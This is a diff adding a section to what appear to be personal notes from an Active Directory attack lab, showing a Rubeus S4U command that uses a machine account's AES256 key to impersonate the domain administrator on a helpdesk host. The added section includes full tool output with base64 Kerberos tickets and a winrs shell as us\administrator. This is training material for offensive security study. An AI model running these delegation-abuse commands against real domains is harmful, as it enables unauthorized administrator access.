@@ -649,3 +649,156 @@ SID               : S-1-5-21-210670787-2521448726-163245708-16107
 
 mimikatz #
 ```
+Impersonate user admministrator of us-helpdesk with rubeus and machine student17$ ases256 hash, and access to the target machine: 
+```
+C:\AD\Tools\Rubeus.exe s4u /user:student17$ /aes256:47054c261e84434a9491465fba6cbea2efea6b8acf99e52054746d44f5d1f35d /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.1
+
+[*] Action: S4U
+
+[*] Using aes256_cts_hmac_sha1 hash: 47054c261e84434a9491465fba6cbea2efea6b8acf99e52054746d44f5d1f35d
+[*] Building AS-REQ (w/ preauth) for: 'us.techcorp.local\student17$'
+[*] Using domain controller: 192.168.1.2:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIFzDCCBcigAwIBBaEDAgEWooIEwDCCBLxhggS4MIIEtKADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FM
+      oiYwJKADAgECoR0wGxsGa3JidGd0GxF1cy50ZWNoY29ycC5sb2NhbKOCBG4wggRqoAMCARKhAwIBAqKC
+      BFwEggRYStWiGtyMX08qS9yf0pDJoy4kCWeCohsfUm5K4PYGjIsdu7q24CXNsNRdb5XQHU6EXa4vh6Kf
+      HyBH+yKl5fHf4NHRy1j9xWoErDKTqjE9RR0oIBV4VXMctFrYg+baChQ8v6S0AscQJEae7jH6PhoPJ3dC
+      f4HfbWmdvH91z9S6di4l78a9RNpV5eHKPQCqBKdnkhBMOMeRMfpvE+eGpqXa78Lq8+NKq/GKoknegETM
+      fyuliU5IUr5IAKNiClQGboHvx7jQROcltuv2YFepwZ8sh7Q7D/in0+DhD8mEZ92A2QgZSPzLeDFav1ny
+      zXrCM6zZuqlydIrUC0spLb6LFW0Ctfwfd3LdOJhQomauFuUpAhkLfCVs610P4qDUOcQBkkOgcg5JBKHX
+      rK66raApC4mDdLkMajgrmYzPPl2LErULP0tj0pgr0E2RqpCkCtflDf3OyD8/z+IyfWhuwgSc3ji9z9eP
+      piqUwMQJudP5z1p8QOLYmLMfUMzXR94RQNcrm7Hi4qCUsgsUn6w5ZTmQB3OiYqxAi4SYHv1QU4Kd74aA
+      Vtw84nUlN8THOuLu4wSAUzIp8hO1uVkRPE0gIB+kqCnJ/FcLEGmAEjSQfnZUVfrIuTPvj56ZxPdFzsQ6
+      wGbKXJM7yAsQgHJee9Pejb0waMyrHhEoprIBGvZoGB9aQXp5tUuOz5p2tzdCXHoW7gf7FBSPf9tasz3A
+      KnZCtHzLsZ7nD74uzD6FQ3DJOJG0j4FsfrPfk7hibRgjuL76JO3TzUl2gdn1cHFtVzMGppO25D/cgVDv
+      F0l8AO3WdTYJ4MPF4fTxwFYxbZq41HCuX/eY2LACB+YzMUbog+AiMOiPh34q3kHVZS/w0vBvJiQItgWI
+      Ud0twM7KCBU4G50GvDTTeGLLo6HqUj95spo7T3X1RtNSZ/iE2Qxyi2hzFa3EYtUFRICroaw64wpBZUNE
+      7qClW79HzgkX3ctZHay3WbHXRZRNy0i1z2TrwJ8r3Rm8Kmmcb7cj4B6kpyIeO5p4R4Q+DX6wwhXQlplt
+      90/SzJIm0HHsjmpVW6BJcgDIeRkBEhhKcEx8hBDFevMV3G6wSG6+b3vDdPJePZqPLYwpbnyutq4RnkB4
+      FAa1JIdiWPDrNKy0IbllydiaZAXirIOO+LVVcV5hqwWL+jOKBuTvwfHaDkniDLt81AdU1E8hGFs6EYCN
+      rwkaOk9sp4aiInAbEJBwX9mEQQlTakwctUHEDhlVXzo1kZrpHN3vgedy7+StAGAbX5Ph9PmxRNh6mOtE
+      j1lk0HcYMOkykAlqwJDC4nicStQBS9rF6Wc0Z1J4lW2ZgMggqCuRWaeHp7/hUBrnhgKVahqtvKSz7+dF
+      TVEu1+RLGqHWv5EbxC6dlWaOdAWFufdpTW4jVd8iwlRxRMF+uxSDwKBMyLp3GJLx7iI7yFNYxpMSf9H4
+      eiUTDTeuIMX0hWYTIdVvTeGDeJwoBO0SXvus8p5EhDf8MdS+MrOjgfcwgfSgAwIBAKKB7ASB6X2B5jCB
+      46CB4DCB3TCB2qArMCmgAwIBEqEiBCBSjx+zzlOMy5Q8KT8xf7C92KeFAqOhfBLMl2hDQmE8TaETGxFV
+      Uy5URUNIQ09SUC5MT0NBTKIXMBWgAwIBAaEOMAwbCnN0dWRlbnQxNySjBwMFAEDhAAClERgPMjAyMzAy
+      MjAxOTU3MThaphEYDzIwMjMwMjIxMDU1NzE4WqcRGA8yMDIzMDIyNzE5NTcxOFqoExsRVVMuVEVDSENP
+      UlAuTE9DQUypJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEXVzLnRlY2hjb3JwLmxvY2Fs
+
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'student17$@US.TECHCORP.LOCAL'
+[*] Using domain controller: US-DC.us.techcorp.local (192.168.1.2)
+[*] Sending S4U2self request to 192.168.1.2:88
+[+] S4U2self success!
+[*] Got a TGS for 'administrator' to 'student17$@US.TECHCORP.LOCAL'
+[*] base64(ticket.kirbi):
+
+      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
+
+[*] Impersonating user 'administrator' to target SPN 'http/us-helpdesk'
+[*] Building S4U2proxy request for service: 'http/us-helpdesk'
+[*] Using domain controller: US-DC.us.techcorp.local (192.168.1.2)
+[*] Sending S4U2proxy request to domain controller 192.168.1.2:88
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN 'http/us-helpdesk':
+
+      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
+      FTATGwRodHRwGwt1cy1oZWxwZGVzaw==
+[+] Ticket successfully imported!
+
+C:\Windows\system32>klist
+
+Current LogonId is 0:0x184bfdc
+
+Cached Tickets: (1)
+
+#0>     Client: administrator @ US.TECHCORP.LOCAL
+        Server: http/us-helpdesk @ US.TECHCORP.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
+        Start Time: 2/20/2023 11:57:18 (local)
+        End Time:   2/20/2023 21:57:18 (local)
+        Renew Time: 2/27/2023 11:57:18 (local)
+        Session Key Type: AES-128-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called:
+
+C:\Windows\system32>winrs -r:us-helpdesk cmd
+Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator.US>hostname
+hostname
+US-HelpDesk
+
+C:\Users\Administrator.US>whoami
+whoami
+us\administrator
+
+C:\Users\Administrator.US>
+```
